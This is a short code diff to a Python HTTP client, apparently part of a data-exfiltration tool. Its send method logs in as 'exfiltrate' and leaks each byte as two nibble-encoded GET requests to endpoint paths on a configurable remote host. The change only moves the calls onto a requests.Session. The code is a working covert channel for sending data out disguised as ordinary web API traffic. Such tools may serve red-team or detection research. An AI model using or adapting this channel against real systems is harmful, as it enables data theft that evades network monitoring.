@@ -14,17 +14,18 @@ class HttpClient(Client):
 
     def send(self, data: bytes):
         endpoint_base = f"http://{self.ip}:{self.port}/users"
-        response = requests.post(f"{endpoint_base}/login", json={"username": "exfiltrate", "password": "data"}, headers=HEADERS)
+        session = requests.Session()
+        response = session.post(f"{endpoint_base}/login", json={"username": "exfiltrate", "password": "data"}, headers=HEADERS)
         print(response.json())
         for byte in data:
             upper, lower = self.__split_byte(byte)
             endpoint_node = self.__get_byte_endpoint(lower)
-            response = requests.get(f"{endpoint_base}/{endpoint_node}", headers=HEADERS)
+            response = session.get(f"{endpoint_base}/{endpoint_node}", headers=HEADERS)
             print(response.json())
             endpoint_node = self.__get_byte_endpoint(upper)
-            response = requests.get(f"{endpoint_base}/{endpoint_node}", headers=HEADERS)
+            response = session.get(f"{endpoint_base}/{endpoint_node}", headers=HEADERS)
             print(response.json())
-        response = requests.post(f"{endpoint_base}/logout", headers=HEADERS)
+        response = session.post(f"{endpoint_base}/logout", headers=HEADERS)
         print(response.json())
 
     @staticmethod
